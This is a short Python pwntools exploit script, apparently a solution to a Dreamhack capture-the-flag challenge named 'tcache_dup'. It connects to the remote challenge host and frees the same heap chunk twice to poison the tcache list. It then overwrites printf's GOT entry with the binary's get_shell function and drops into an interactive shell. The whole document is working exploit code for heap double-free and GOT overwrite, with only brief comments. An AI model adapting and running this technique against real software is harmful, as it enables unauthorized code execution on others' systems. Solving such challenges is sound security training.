from pwn import *

p = remote('host3.dreamhack.games', 24519)
elf = ELF('./tcache_dup')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())


create(0x20, b'a')


# tcache[0x20] : chunk (1)
delete(0)  # (1)


# tcache[0x20] : chunk(2) -> chunk (1)
delete(0)  # (2)


printf_got = elf.got['printf']
# tcache[0x20] : chunk(1) -> printf@got
create(0x20, p64(printf_got))


# tcache[0x20] : printf@got
create(0x20, b'a')


get_shell = elf.symbols['get_shell']
# tcache[0x20] : empty

create(0x20, p64(get_shell))

p.interactive()
